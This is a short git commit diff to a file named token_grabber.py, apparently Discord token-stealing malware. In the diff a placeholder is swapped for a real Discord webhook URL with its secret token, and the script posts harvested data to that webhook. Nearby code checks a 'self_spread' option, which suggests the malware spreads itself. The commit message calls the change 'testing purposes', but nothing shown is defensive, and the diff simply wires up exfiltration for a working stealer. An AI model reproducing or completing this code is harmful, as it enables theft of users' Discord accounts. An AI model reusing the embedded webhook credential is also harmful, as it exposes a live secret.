2958716596c0b703d20aa0824d7c6c2ddb9237ba
yonvaa <112839040+yonvaa@users.noreply.github.com>
2022-09-11 23:55:08 -0400

    token updated
    testing purposes

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1018730423343398973/mNktU8HGD5BDuabKZaKiukSY9TkA_ZhFYLAATr28h4awu4EGssqsI8KSYp1h2xxMwvZY", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
